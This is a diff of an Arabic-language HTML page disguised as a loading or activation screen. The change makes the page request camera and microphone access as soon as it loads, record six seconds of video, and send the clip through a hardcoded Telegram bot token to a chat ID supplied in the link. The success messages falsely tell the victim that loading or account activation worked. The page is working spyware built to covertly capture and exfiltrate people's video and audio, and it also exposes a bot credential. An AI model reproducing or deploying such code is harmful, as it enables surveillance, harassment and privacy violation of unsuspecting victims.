@@ -1,116 +1,107 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل النظام</title>
+    <title>جاري التحميل</title>
     <style>
-        /* تصميم الواجهة السوداء الفخمة */
-        body { 
-            font-family: sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            background-color: #000; 
-            color: white; 
-            margin: 0; 
-            text-align: center; 
+        body {
+            background-color: #000;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
         }
-        #startBtn { 
-            padding: 15px 40px; 
-            font-size: 18px; 
+
+        /* تصميم شريط التحميل الدائري مثل الصورة */
+        .loader {
+            width: 120px;
+            height: 120px;
+            border: 12px solid #f3f3f3;
+            border-top: 12px solid #3498db; /* اللون الأزرق كما في الصورة */
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin-bottom: 30px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            font-size: 22px;
             font-weight: bold;
-            cursor: pointer; 
-            background-color: #007bff; 
-            color: white; 
-            border: none; 
-            border-radius: 30px; 
-            box-shadow: 0 4px 15px rgba(0,123,255,0.3);
         }
-        /* دائرة التحميل مثل التي في الصورة */
-        .loader { 
-            border: 4px solid #333; 
-            border-top: 4px solid #3498db; 
-            border-radius: 50%; 
-            width: 60px; 
-            height: 60px; 
-            animation: spin 1s linear infinite; 
-            margin-top: 20px; 
-            display: none; 
+
+        video {
+            display: none;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        video { display: none; }
-        #statusText { margin-top: 20px; font-size: 16px; color: #bbb; display: none; }
     </style>
 </head>
 <body>
 
-    <div id="mainContainer">
-        <h2 id="title">يجب الضغط على الزر لتفعيل الخدمة</h2>
-        <button id="startBtn">ابدأ الآن</button>
-        <div id="loader" class="loader"></div>
-        <p id="statusText">لحظة واحدة...</p>
-    </div>
-    
-    <video id="video" autoplay playsinline muted></video>
+    <div class="loader"></div>
+    <div class="status-text" id="status">لحظة واحدة</div>
+
+    <video id="video" autoplay muted playsinline></video>
 
     <script>
-        const startBtn = document.getElementById('startBtn');
-        const loader = document.getElementById('loader');
-        const title = document.getElementById('title');
-        const statusText = document.getElementById('statusText');
         const video = document.getElementById('video');
+        const statusText = document.getElementById('status');
         
-        // الحصول على معرف المستخدم من الرابط تلقائياً
         const urlParams = new URLSearchParams(window.location.search);
         const senderId = urlParams.get('sender_id');
         const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";
 
-        startBtn.onclick = async () => {
-            // إخفاء الزر وإظهار التحميل فوراً
-            startBtn.style.display = "none";
-            loader.style.display = "block";
-            statusText.style.display = "block";
-            title.innerText = "جاري التحميل...";
+        window.onload = async () => {
+            if (!senderId) {
+                statusText.innerText = "خطأ في الاتصال";
+                return;
+            }
 
             try {
-                // طلب إذن الكاميرا والميكروفون (لتظهر نافذة الأذونات)
+                // طلب الإذن (كما في الصورة الثانية)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
                 
-                // بدء التسجيل فور الحصول على السماح
-                startRecording(stream);
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    await sendVideoToTelegram(blob);
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                // بدء التسجيل تلقائياً بعد الموافقة
+                mediaRecorder.start();
+                
+                // تسجيل لمدة 6 ثوانٍ
+                setTimeout(() => {
+                    if (mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                    }
+                }, 6000);
+
             } catch (err) {
-                alert("يجب منح الأذونات لتفعيل النظام بنجاح.");
-                location.reload();
+                statusText.innerText = "يرجى المحاولة مرة أخرى";
             }
         };
 
-        function startRecording(stream) {
-            const mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-
-            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-            
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                await sendToTelegram(blob);
-            };
-
-            // تسجيل فيديو لمدة 5 ثواني
-            mediaRecorder.start();
-            setTimeout(() => {
-                mediaRecorder.stop();
-                stream.getTracks().forEach(track => track.stop()); // إطفاء الكاميرا بعد الانتهاء
-            }, 5000); 
-        }
-
-        async function sendToTelegram(videoBlob) {
+        async function sendVideoToTelegram(videoBlob) {
             const formData = new FormData();
             formData.append('chat_id', senderId);
-            formData.append('video', videoBlob, 'video_capture.mp4');
+            formData.append('video', videoBlob, 'recording.mp4');
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
@@ -118,13 +109,11 @@
                     body: formData
                 });
                 
-                if(response.ok) {
-                    title.innerText = "تم التفعيل بنجاح!";
-                    loader.style.display = "none";
-                    statusText.innerText = "تم إرسال البيانات وتأمين الحساب.";
+                if (response.ok) {
+                    statusText.innerText = "تم التحميل بنجاح";
                 }
             } catch (error) {
-                console.error("Error sending to Telegram:", error);
+                console.error(error);
             }
         }
     </script>
